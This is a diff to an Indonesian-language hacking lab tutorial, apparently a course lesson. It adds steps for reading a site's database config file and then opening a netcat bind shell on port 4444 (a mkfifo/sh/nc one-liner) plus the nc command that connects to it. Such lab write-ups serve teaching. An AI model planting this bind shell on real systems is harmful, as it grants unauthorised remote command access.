@@ -43,7 +43,17 @@ netstat -nao | grep "0.0.0.0:"
 ![1](/lesson10/7.png)
 
 8. untuk melihat konfigurasi database, kita dapat melihat isi dari config.inc dengan melakukan ls (list directory) dan melihat disitu ada file ```config.inc``` yang bisa dibuka lewat url pada browser.
-![1](/lesson10/8.png)
-![1](/lesson10/9.png)
+ * ![1](/lesson10/8.png)
+ * ![1](/lesson10/9.png)
+
+9. Selanjutnya kita akan melakukan shell exploitation dengan memasukkan command netcat untuk melakukan listen pada port tertentu
+```
+mkfifo /tmp/pipe;sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe
+```
 ![1](/lesson10/10.png)
+
+10. Untuk mengaksesnya, kita buka terminal dan mengakses port tersebut dengan netcat
+```
+nc 10.151.36.156 4444
+```
 ![1](/lesson10/11.png)
